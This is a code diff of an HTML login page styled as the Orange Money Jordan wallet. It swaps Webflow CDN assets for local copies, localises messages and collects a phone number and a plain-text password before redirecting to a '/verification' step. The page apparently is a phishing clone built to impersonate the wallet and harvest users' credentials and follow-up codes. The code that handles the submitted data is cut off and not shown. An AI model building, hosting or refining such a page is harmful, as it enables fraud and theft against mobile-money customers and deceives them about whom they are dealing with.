@@ -10,15 +10,15 @@
     <title>Orange Money - الصفحة الرئيسية</title>
     <meta content="Orange Money Jo" property="og:title">
     <meta content="محفظة Orange Money Jo" property="og:description">
-    <meta content="/assets/imgs/og_img.jpg" property="og:image">
+    <meta content="/assets/img/og_img.jpg" property="og:image">
     <meta content="Orange Money Jo" property="twitter:title">
     <meta content="محفظة Orange Money Jo" property="twitter:description">
-    <meta content="https://cdn.prod.website-files.com/666e729fb80c1977761b0653/6673eac4fdd598fdb1964e58_448502319_1665996197496616_7531919784203745278_n.jpg" property="twitter:image">
+    <meta content="/assets/img/og_img.jpg" property="twitter:image">
     <meta property="og:type" content="website">
     <meta content="summary_large_image" name="twitter:card">
     <meta content="width=device-width, initial-scale=1" name="viewport">
     <meta content="Webflow" name="generator">
-    <link href="https://cdn.prod.website-files.com/686bf05165306b123b50bc5c/css/omo10.webflow.shared.4cef0453e.css" rel="stylesheet" type="text/css">
+    <link href="/assets/css/main.css" rel="stylesheet" type="text/css">
     <link href="https://fonts.googleapis.com" rel="preconnect">
     <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
     <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
@@ -31,8 +31,8 @@
             t = " w-mod-";
         n.className += t + "js", ("ontouchstart" in o || o.DocumentTouch && c instanceof DocumentTouch) && (n.className += t + "touch") }(window, document);
     </script>
-    <link href="https://cdn.prod.website-files.com/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
-    <link href="https://cdn.prod.website-files.com/img/webclip.png" rel="apple-touch-icon">
+    <link href="/assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <!-- <link href="https://cdn.prod.website-files.com/img/webclip.png" rel="apple-touch-icon"> -->
     <style>
         body {
   box-sizing: border-box; 
@@ -101,45 +101,63 @@
 <body class="body">
     <div class="div-block-2">
         <div class="header-section" style="transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg); transform-style: preserve-3d; opacity: 1;">
-            <div class="w-container"><a href="/" aria-current="page" class="blog-home-link w-inline-block w--current"><img src="https://cdn.prod.website-files.com/686bf05165306b123b50bc5c/686bf05165306b123b50bd1e_OM%20logo_0.svg" loading="lazy" width="106" height="Auto" alt="" class="image"></a></div>
+            <div class="w-container">
+                <a href="/" aria-current="page" class="blog-home-link w-inline-block w--current">
+                    <img src="/assets/img/logo.svg" loading="lazy" width="106" height="Auto" alt="" class="image">
+                </a>
+            </div>
         </div>
     </div>
     <div class="div-block-4">
         <div class="container">
             <div class="w-form">
                 <form id="signin" name="wf-form-" data-name="تسجيل الدخول" redirect="/verification" data-redirect="/verification" method="get" aria-label="تسجيل الدخول">
-                    <div id="field" class="field-holder"><input class="text-field-2 w-input" maxlength="10" name="field" data-name="رقم الهاتف" pattern="\d{10,10}" placeholder="" type="text" id="phonenumber" required=""><label for="phonenumber">رقم الهاتف</label></div>
-                    <div id="field" class="field-holder"><input class="text-field-2 w-input" maxlength="256" name="field" data-name="كلمة السر" placeholder="" type="text" id="password" required=""><label for="password">كلمة المرور</label></div>
+                    <div id="field" class="field-holder">
+                        <input class="text-field-2 w-input" maxlength="10" name="field" data-name="رقم الهاتف" pattern="\d{10,10}" placeholder="" type="text" id="phonenumber" required="">
+                        <label for="phonenumber">رقم الهاتف</label>
+                    </div>
+                    <div id="field" class="field-holder">
+                        <input class="text-field-2 w-input" maxlength="256" name="field" data-name="كلمة السر" placeholder="" type="text" id="password" required="">
+                        <label for="password">كلمة المرور</label>
+                    </div>
                     <div class="div-block">
-                        <div id="invalid_password_label" class="invalid_password_hide">يرجى أدخال كلمة المرور بشكل صحيح</div><input type="submit" data-wait="يرجى الانتظار" id="sb" class="submit-button sb_disabled w-button" value="تسجيل دخول">
+                        <div id="invalid_password_label" class="invalid_password_hide"> يرجى أدخال كلمة المرور بشكل صحيح </div>
+                        <input type="submit" data-wait="يرجى الانتظار" id="sb" class="submit-button sb_disabled w-button" value="تسجيل دخول">
                     </div>
                 </form>
-                <div class="w-form-done" tabindex="-1" role="region" aria-label="تسجيل الدخول success">
+<!--                 <div class="w-form-done" tabindex="-1" role="region" aria-label="تسجيل الدخول success">
                     <div>Thank you! Your submission has been received!</div>
-                </div>
+                </div> -->
                 <div class="w-form-fail" tabindex="-1" role="region" aria-label="تسجيل الدخول failure">
-                    <div>Oops! Something went wrong while submitting the form.</div>
+                    <div>حدث خطأ يرجى المحاولة لاحقا.</div>
                 </div>
             </div>
         </div>
     </div>
     <div class="customfooter">
         <div id="w-node-f65d2256-05c2-d21e-f218-de1540063814-3b50bc54">
-            <div class="text-block"><span class="text-span-8">Orange Money JO<br></span><span class="text-span-7">معتمدة من</span><br><br></div>
+            <div class="text-block">
+                <span class="text-span-8">Orange Money JO
+                    <br>
+                </span>
+                <span class="text-span-7">معتمدة من
+                </span>
+                <br>
+                <br>
+            </div>
         </div>
         <div id="w-node-_4ae6631d-880a-bff2-c311-34238278abc4-3b50bc54" class="div-block-5">
             <div class="columns-2 w-row">
-                <div class="column-5 w-col w-col-6 w-col-tiny-6"><img src="https://cdn.prod.website-files.com/686bf05165306b123b50bc5c/686bf05165306b123b50bd27_Group%2039747%402x.png" loading="lazy" width="130" alt=""></div>
-                <div class="column-4 w-col w-col-6 w-col-tiny-6"><img src="https://cdn.prod.website-files.com/686bf05165306b123b50bc5c/686bf05165306b123b50bd18_cbj_logo2-01%20copy1%402x_0.png" loading="lazy" width="110" alt=""></div>
+                <div class="column-5 w-col w-col-6 w-col-tiny-6">
+                    <img src="/assets/img/Group@2x.png" loading="lazy" width="130" alt="">
+                </div>
+                <div class="column-4 w-col w-col-6 w-col-tiny-6">
+                    <img src="/assets/img/cbj@2x_0.png" loading="lazy" width="110" alt="">
+                </div>
             </div>
         </div>
     </div>
     <script>
-    /*  window.addEventListener('load', function(){
-  password = document.getElementById('password')
-  password.pattern  = '^(?=.*?[a-zA-Z])(?=.*?[0-9])(?=.*?[@#$_&+\\(\\)\\\\\\/*\"\':;!?`•\\|√π÷×§∆£¢€¥° %©®™✓\\[\\]\\{\\}\\^\\=]).{6,}$'
-  })
-*/
     document.addEventListener("DOMContentLoaded", () => {
         const sb = document.querySelector("#sb")
         const invalid_password_label = document.querySelector("#invalid_password_label");
